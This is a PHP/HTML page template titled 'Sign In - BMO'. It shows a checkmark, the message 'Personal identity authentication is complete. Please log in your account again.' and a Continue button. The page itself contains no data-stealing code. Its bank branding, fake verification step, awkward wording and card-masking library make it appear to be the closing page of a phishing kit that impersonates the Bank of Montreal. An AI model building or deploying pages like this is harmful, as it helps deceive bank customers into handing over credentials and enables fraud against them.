<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign In - BMO</title>

  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  <link rel="stylesheet" href="/assets/css/styles.css">
  <script src="https://kit.fontawesome.com/64664913ea.js" crossorigin="anonymous"></script>
</head>
<body>

  <?php
    include('views/templates/nav.php');
  ?>
  <div class="container maxheight-container mt-5">
    <div class="shadow card-container">
      <!-- <img class="logo-check" src="/assets/media/icons8-checkmark.gif" width="64px"> -->
      <!-- <img class="logo-check" src="/assets/media/icons8-checkmark.gif" width="64px"> -->
      <svg fill="green" xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 128 128" width="64px" height="64px"><path d="M 64 1 C 29.3 1 1 29.3 1 64 C 1 98.7 29.3 127 64 127 C 98.7 127 127 98.7 127 64 C 127 29.3 98.7 1 64 1 z M 64 7 C 95.4 7 121 32.6 121 64 C 121 95.4 95.4 121 64 121 C 32.6 121 7 95.4 7 64 C 7 32.6 32.6 7 64 7 z M 93.775391 38 C 93.000391 38.05 92.249219 38.4 91.699219 39 L 63.800781 71.599609 L 51.099609 58.900391 C 49.899609 57.700391 48.000391 57.700391 46.900391 58.900391 C 45.700391 60.100391 45.700391 61.999609 46.900391 63.099609 L 61.900391 78.099609 C 62.500391 78.699609 63.2 79 64 79 L 64.099609 79 C 64.899609 79 65.700781 78.6 66.300781 78 L 96.300781 43 C 97.400781 41.7 97.2 39.800781 96 38.800781 C 95.35 38.200781 94.550391 37.95 93.775391 38 z"/></svg>
      <h1 class="text-center mx-auto">Thank you! Personal identity authentication is complete. Please log in your account again.</h1>
      <button class="mt-4 p-3 px-5 fs-6 fw-bold btn btn-primary btn-lg rounded-pill d-block mx-auto">Continue</button>
    </div>
  </div>

  <?php
    include('views/templates/footer.php');
  ?>

  <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.js" 
        integrity="sha256-yE5LLp5HSQ/z+hJeCqkz9hdjNkk1jaiGG0tDCraumnA=" 
        crossorigin="anonymous"></script>

  <script src="/assets/js/main.js"></script>
</body>
</html>